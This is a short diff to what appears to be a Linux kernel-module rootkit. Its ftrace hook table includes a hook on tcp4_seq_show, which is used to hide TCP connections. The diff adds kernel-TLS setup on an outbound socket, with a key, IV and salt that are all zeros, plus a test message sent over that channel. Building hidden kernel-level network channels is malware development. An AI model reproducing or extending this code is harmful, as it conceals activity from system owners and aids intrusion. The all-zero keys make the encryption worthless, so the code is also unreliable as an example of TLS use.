@@ -28,6 +28,26 @@ static struct ftrace_hook hooks[] = {
     HOOK("tcp4_seq_show", hook_tcp4, &orig_tcp4_seq_show),
 };
 
+static void test_ktl_send(void) {
+  int ret;
+  char send_buf[] = "KTLS WORK PLS";
+
+  if (!sock || !sock->sk || sock->sk->sk_state != TCP_ESTABLISHED) {
+    pr_err("test_ktls_send: socket not ready\n");
+    return;
+  }
+
+  pr_info("test_ktls_send: sending message: %s\n", send_buf);
+
+  ret = tcp_send(sock, send_buf, strlen(send_buf));
+  if (ret < 0) {
+    pr_err("test_ktls_send: tcp_send failed: %d\n", ret);
+    return;
+  }
+
+  pr_info("test_ktls_send: message sent successfully (%d bytes)\n", ret);
+}
+
 static void print_buffer(const char *label, const u8 *buf, size_t len) {
   size_t i;
   pr_info("%s: ", label);
@@ -86,6 +106,23 @@ static int __init lkm_init(void) {
     printk(KERN_INFO "socket_init failed\n");
     return ret;
   }
+
+  // now only for testing
+
+  unsigned char key[TLS_KEY_SIZE] = {0};
+  unsigned char iv[TLS_IV_SIZE] = {0};
+  unsigned char salt[TLS_SALT_SIZE] = {0};
+  unsigned char tx_seq[TLS_SEQ_SIZE] = {0};
+  unsigned char rx_seq[TLS_SEQ_SIZE] = {0};
+
+  ret = tls_setup_socket(sock, key, iv, salt, tx_seq, rx_seq);
+  if (ret < 0) {
+    printk(KERN_ERR "tls_setup_socket failed: %d\n", ret);
+    sock_release(sock);
+    return ret;
+  }
+
+  test_ktl_send();
 
   return 0;
 cleanup:
